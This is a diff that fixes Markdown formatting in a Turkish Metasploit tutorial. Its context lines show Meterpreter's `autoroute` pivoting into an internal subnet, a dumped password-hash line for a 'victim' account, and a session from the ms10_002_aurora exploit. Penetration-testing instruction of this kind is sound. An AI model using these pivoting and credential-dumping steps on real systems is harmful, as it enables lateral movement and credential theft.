@@ -179,7 +179,7 @@ Meterpreter’in sağladığı imkanlardan bir tanesi de `autoroute` script kodu
 
 ```bash
 meterpreter > run autoroute -h
-> Usage:   run autoroute **[**-r**]** -s subnet -n netmask
+> Usage:   run autoroute [-r] -s subnet -n netmask
 > Examples:
 >   run autoroute -s 10.1.1.0 -n 255.255.255.0  # Add a route to 10.10.10.1/255.255.255.0
 >   run autoroute -s 10.10.10.1                 # Netmask defaults to 255.255.255.0
@@ -197,7 +197,7 @@ meterpreter > run autoroute -h
 ```bash
 meterpreter > run autoroute -s 10.1.13.0/24
 > Adding a route to 10.1.13.0/255.255.255.0...
-**[**+] Added route to 10.1.13.0/255.255.255.0 via 192.168.1.201
+[+] Added route to 10.1.13.0/255.255.255.0 via 192.168.1.201
 > Use the -p option to list all active routes
 ```
 
@@ -252,7 +252,7 @@ victim:1004:81cbcea8a9af93bbaad3b435b51404ee:561cbdae13ed5abd30aa94ddeb3cf52d:::
 
 
 meterpreter > 
-Background session 1? **[**y/N]  
+Background session 1? [y/N]  
 msf exploit(ms10_002_aurora) >
 ```
 
